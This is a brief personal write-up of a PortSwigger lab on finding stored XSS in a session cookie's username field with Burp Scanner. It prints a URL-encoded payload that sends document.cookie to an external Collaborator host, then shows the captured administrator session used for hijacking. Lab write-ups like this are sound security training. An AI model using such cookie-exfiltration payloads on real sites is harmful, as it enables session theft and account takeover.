# Scanning non-standard data structures — (PortSwigger — Practitioner)
**Date:** 2026-08-25
 
---
 
## Vulnerability / core concept
Burp Scanner with Specific Input

---


## Payload / key command
This web application has lots of features: search, log in, change email, comment. Manually testing everything would be very slow and inefficient for this lab. Therefore, we will use Burp Scanner to make testing faster.

During interception we can notice that web application uses cookie in format of `username:some-random-token`. First idea was to change that username to `administrator` but it did not work because app was checking identity. Therefore, I selected the username part and send it to Burp Scanner to audit it. After some manual testing, when I checked the issues I noticed Cross-side scripting (stored). I modified the payload to include the `document.cookie` and send it to my collaborator:
```bash
Cookie: session='%22%3e%3csvg%2fonload%3dfetch%60%2f%2f1jlevvzvpt5kv1prbblzcctp4gaay0mscg36qwel%5c.oastify.com${encodeURIComponent(document.cookie)}%60%3e%3axAjKR3tD0A1LSotBiVTaEabfsbyWlDdo
```
In my collaborator in `Request to Collaborator` I found this:
```bash
GET /session%3Dadministrator%253aAhYPcJ98e5zy7xo1cAnhMnZTYWh1RXob%3B%20secret%3D81ijM0taj0BdT3zyMaV0LQLna5NhQqqD%3B%20session%3Dadministrator%253aAhYPcJ98e5zy7xo1cAnhMnZTYWh1RXob HTTP/1.1
```
As you can see we can extract the cookie of the administrator and delete user `carlos` by session hijacking.
